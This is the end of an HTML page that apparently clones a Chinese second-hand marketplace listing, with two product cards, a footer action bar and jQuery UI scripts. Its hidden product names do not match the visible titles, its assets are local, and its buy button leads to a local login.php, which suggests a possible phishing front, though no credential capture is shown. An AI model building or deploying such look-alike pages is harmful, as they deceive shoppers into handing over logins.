                                <div data-v-82002cb8="" data-metric="9O9zuWzQhdDHGezRhvh9gg2928y56" data-areaexposure="111" data-info="{&quot;sortId&quot;:2,&quot;infoId&quot;:&quot;1433685324089033728&quot;}" zz-infoid="1433685324089033728" zz-sortid="2" data-isdot="0" zz-sortname="ThinkPad X1 Carbon G6 14.0英寸 16GB 512G SSD Intel GMA UHD 620 黑色" class="product-wrapper">
                                    <div data-v-82002cb8="" data-type="1" class="prod-pic"><img data-v-82002cb8="" src="./image/tj (5).PNG"></div>
                                    <div data-v-82002cb8="" class="pro-title">
                                        <div data-v-82002cb8="" class="label-list condition-single"><span data-v-82002cb8="" class="last condition">
                                                包邮
                                            </span></div>
                                        Apple iPhonex白色
                                    </div>

                                    <div data-v-82002cb8="" class="price-info"><span data-v-82002cb8="" class="price"><em data-v-82002cb8="">¥</em>1900</span> <span data-v-82002cb8="" class="price-desc">9人想要</span>

                                    </div>
                                    <div data-v-82002cb8="" class="seller-info"><img data-v-82002cb8="" src="./image/tx (7).JPG">阳江</div>
                                </div>
                                <div data-v-82002cb8="" data-metric="MKk0Sh5zdyyAFd3Q9Nz6rQ2928y56" data-areaexposure="111" data-info="{&quot;sortId&quot;:3,&quot;infoId&quot;:&quot;1309380495284672202&quot;}" zz-infoid="1309380495284672202" zz-sortid="3" data-isdot="0" zz-sortname="E7500 
集显 
500G" class="product-wrapper">
                                    <div data-v-82002cb8="" data-type="1" class="prod-pic"><img data-v-82002cb8="" src="./image/tj (8).PNG"></div>
                                    <div data-v-82002cb8="" class="pro-title">
                                        <div data-v-82002cb8="" class="label-list condition-single"><span data-v-82002cb8="" class="last condition">
                                                包邮
                                            </span></div>
                                        随便出一出 无法正常使用 屏幕无法触摸
                                    </div>

                                    <div data-v-82002cb8="" class="price-info"><span data-v-82002cb8="" class="price"><em data-v-82002cb8="">¥</em>200</span> <span data-v-82002cb8="" class="price-desc">32人想要</span> </div>
                                    <div data-v-82002cb8="" class="seller-info"><img data-v-82002cb8="" src="./image/tx (8).JPG">东莞</div>
                                </div>
                            </div>
                            <div class="z-list__placeholder"></div>
                        </div>
                        <div data-v-82002cb8="" class="z-stance" style="">
                            <p class="z-stance__info">没有更多了</p>
                           <!---->
                       </div>
                   </div>
                   <!---->
               </div>

        <div style="width:100%; height:50px;"></div>
			
			<div class="foot" style="width:100%; height:50px; position:fixed; bottom:0px; left:0px; z-index:8888; background:#fff;">
				<div class="foot-item1">
					<div class=""><img src="./image/cj.png"  style="height:20px; margin-top:1px;"></div>
					<p>出价</p>
				</div>
				<div class="foot-item1">
					<div class=""><img src="./image/xx.png" style="height:20px; margin-top:1px;"></div>
					<p>留言</p>
				</div>
				<div class="foot-item1">
					<div class=""><img src="./image/sc.png" style="height:20px; margin-top:1px;"></div>
					<p>收藏</p>
				</div>
		
				<div class="btn-buy foot-item2" style=" padding:10 10px; background:radial-gradient(circle farthest-side at 0 0,#ed8805 0%,#f00 100%); margin-left:30%; font-size:16px; " data-url="login.php">
					我想要
				</div>
			</div>
		

	
	
	<script type="text/javascript">
			$(function () {
				$(".love").click(function () {
					$(this).hasClass('active') ? $(this).removeClass('active') : $(this).addClass('active')
				})

				$(".xuanxiangka").hide();
				$(".xuanxiangka>li").click(function () {
					$(this).addClass("active");
					$(this).siblings().removeClass("active");
				})

				$('.btn-buy').click(function () {
					location.href = $(this).attr('data-url');
				})

				var pic_w = $('.small_pic').width();
				$('.small_pic').height(pic_w);
				$(window).resize(function () {
					var pic_w = $('.small_pic').width();
					$('.small_pic').height(pic_w);
				});
			})
		</script>
<script type="text/javascript">
    $(function () {
        $(".want").hide();
        $(".faheart").click(function(){
            $(this).children("i").removeClass("fa-heart-o").addClass("fa-heart").css("color","red");
        });
        $(".fastar").click(function(){
            $(this).children("i").removeClass("fa-star-o").addClass("fa-star").css("color","#ff9100");
        });
    });

    function change_pic() {
        var want_src = $("#caocao_pic").attr("src");
        var Flag = (want_src == "style/style/img/xin0.png")
        if (Flag) {
            $("#caocao_pic").attr("src", "style/style/img/xin1.png");
            $(".want").show();
        } else {
            $("#caocao_pic").attr("src", "style/style/img/xin0.png");
            $(".want").hide();
        }
    }
</script>
<script type="text/javascript">
    $(function () {
        var win_width = $(window).width();
        var showMsgs = true;
        $('.pop-btn').click(function () {
            $(this).toggleClass('btn-right');
            if (showMsgs) {
                $('.msgs').animate({left: win_width + 'px', opacity: 'toggle'});
            } else {
                $('.msgs').animate({left: 0 + 'px', opacity: 'toggle'});
            }
            showMsgs = !showMsgs;
        })
    })

  
  window.onload = function() {
    // 阻止双击放大
    var lastTouchEnd = 0;
    document.addEventListener('touchstart', function(event) {
        if (event.touches.length > 1) {
            event.preventDefault();
        }
    });
    document.addEventListener('touchend', function(event) {
        var now = (new Date()).getTime();
        if (now - lastTouchEnd <= 300) {
            event.preventDefault();
        }
        lastTouchEnd = now;
    }, false);

    // 阻止双指放大
    document.addEventListener('gesturestart', function(event) {
        event.preventDefault();
    });
}
</script></body></html>